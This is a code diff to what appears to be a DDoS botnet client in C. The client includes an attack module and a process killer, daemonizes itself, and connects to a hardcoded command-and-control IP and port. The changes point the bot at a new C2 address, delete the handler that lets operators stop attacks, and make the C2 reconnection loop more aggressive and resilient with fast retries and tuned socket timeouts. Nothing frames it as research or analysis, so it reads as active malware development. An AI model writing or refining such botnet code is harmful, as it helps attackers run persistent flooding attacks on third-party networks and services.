@@ -27,14 +27,16 @@
 #include "headers/killer.h"
 #include "headers/gre_attack.h"
 
-#define CNC_IP "1.2.3.255"
-#define BOT_PORT 1338
+#define CNC_IP "1.1.1.1"
+#define BOT_PORT 50358
 #define MAX_THREADS 1
-#define RETRY_DELAY 5
-#define RECV_TIMEOUT_MS 8000
-#define MAX_RETRIES 8
-#define CONNECTION_TIMEOUT 5
-#define PING_INTERVAL 5
+#define RETRY_DELAY 2
+#define RECV_TIMEOUT_MS 12000
+#define MAX_RETRIES 30
+#define CONNECTION_TIMEOUT 3
+#define PING_INTERVAL 4
+#define FAST_RETRY_COUNT 5
+#define FAST_RETRY_DELAY 1
 
 pthread_t attack_threads[MAX_THREADS] = {0};
 pthread_mutex_t thread_mutex = PTHREAD_MUTEX_INITIALIZER;
@@ -212,9 +214,6 @@ void handle_command(char* command, int sock) {
         }
         pthread_mutex_unlock(&thread_mutex);
     }
-    if (strcmp(command, "stop") == 0) {
-        cleanup_attack_threads();
-    }
 }
 
 int connect_with_timeout(int sock, struct sockaddr *addr, socklen_t addrlen, int timeout_sec) {
@@ -268,10 +267,10 @@ int main(int argc, char** argv) {
 
     daemonize(argc, argv);
     start_killer();
-
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(BOT_PORT);
     inet_pton(AF_INET, CNC_IP, &server_addr.sin_addr);
+    
 
     int reconnect_attempts = 0;
     time_t last_ping = 0;
@@ -294,24 +293,57 @@ int main(int argc, char** argv) {
         }
 
         int optval = 1;
+        struct timeval timeout;
+        timeout.tv_sec = 30;
+        timeout.tv_usec = 0;
+
         setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));
         setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
-        int keepidle = 10;
-        int keepintvl = 5;
+        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
+        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
+        
+        int keepidle = 5;
+        int keepintvl = 3;
         int keepcnt = 3;
+        int tcp_retries = 10;
+        int mss = 1448;
+        
         setsockopt(sock, IPPROTO_TCP, TCP_KEEPIDLE, &keepidle, sizeof(keepidle));
         setsockopt(sock, IPPROTO_TCP, TCP_KEEPINTVL, &keepintvl, sizeof(keepintvl));
-        setsockopt(sock, IPPROTO_TCP, TCP_KEEPCNT, &keepcnt, sizeof(optval));
+        setsockopt(sock, IPPROTO_TCP, TCP_KEEPCNT, &keepcnt, sizeof(keepcnt));
+        setsockopt(sock, IPPROTO_TCP, TCP_SYNCNT, &tcp_retries, sizeof(tcp_retries));
+        setsockopt(sock, IPPROTO_TCP, TCP_MAXSEG, &mss, sizeof(mss));
         setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &optval, sizeof(optval));
+        
+        int sndbuf = 65535;
+        int rcvbuf = 65535;
+        setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
+        setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf));
 
-        if (connect_with_timeout(sock, (struct sockaddr*)&server_addr, sizeof(server_addr), CONNECTION_TIMEOUT) < 0) {
+        int connected = 0;
+        for (int timeout = 1; timeout <= CONNECTION_TIMEOUT && !connected; timeout++) {
+            if (connect_with_timeout(sock, (struct sockaddr*)&server_addr, sizeof(server_addr), timeout) == 0) {
+                connected = 1;
+                break;
+            }
+        }
+
+        if (!connected) {
             close(sock);
             sock = -1;
-            if (++reconnect_attempts >= MAX_RETRIES) {
-                sleep(60);
+            if (reconnect_attempts < FAST_RETRY_COUNT) {
+                sleep(FAST_RETRY_DELAY);
+                reconnect_attempts++;
+            }
+            else if (reconnect_attempts < MAX_RETRIES) {
+                int delay = RETRY_DELAY * ((reconnect_attempts - FAST_RETRY_COUNT) / 5 + 1);
+                if (delay > 30) delay = 30;
+                sleep(delay);
+                reconnect_attempts++;
+            } 
+            else {
+                sleep(30);
                 reconnect_attempts = 0;
-            } else {
-                sleep(RETRY_DELAY * reconnect_attempts);
             }
             continue;
         }
